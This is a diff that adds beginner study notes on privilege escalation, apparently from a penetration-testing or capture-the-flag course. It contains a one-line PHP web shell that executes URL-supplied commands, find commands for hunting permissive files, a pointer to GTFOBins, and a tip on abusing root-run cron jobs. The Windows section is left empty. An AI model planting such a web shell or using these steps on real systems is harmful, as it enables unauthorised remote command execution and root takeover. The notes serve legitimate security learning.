@@ -1,0 +1,44 @@
+What does "privilege escalation" mean?
+
+At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.
+
+
+Why is it important?
+
+It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:
+
+    -Resetting passwords
+    -Bypassing access controls to compromise protected data
+    -Editing software configurations
+    -Enabling persistence
+    -Changing the privilege of existing (or new) users
+    -Execute any administrative command
+
+linux:
+    In a very basic one line format:
+
+    "<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>"
+
+    This will take a GET parameter in the URL and execute it on the system with shell_exec(). Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page
+
+    Find files:
+
+        find . -name flag1.txt: find the file named “flag1.txt” in the current directory
+        find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
+        find / -type d -name config: find the directory named config under “/”
+        find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
+        find / -perm a=x: find executable files
+        find /home -user frank: find all files for user “frank” under “/home”
+        find / -mtime 10: find files that were modified in the last 10 days
+        find / -atime 10: find files that were accessed in the last 10 day
+        find / -cmin -60: find files changed within the last hour (60 minutes)
+        find / -amin -60: find files accesses within the last hour (60 minutes)
+        find / -size 50M: find files with a 50 MB size
+
+    Python version : : python -V
+
+    https://gtfobins.github.io/  this resource is a site that shows which command how to upgrade.
+
+    Under the /etc/crontab file, if there is a file that is run with root permission, we can run those files as we want and enter the system as root. Do not forget to add chmod +x to the created file.
+
+windows:
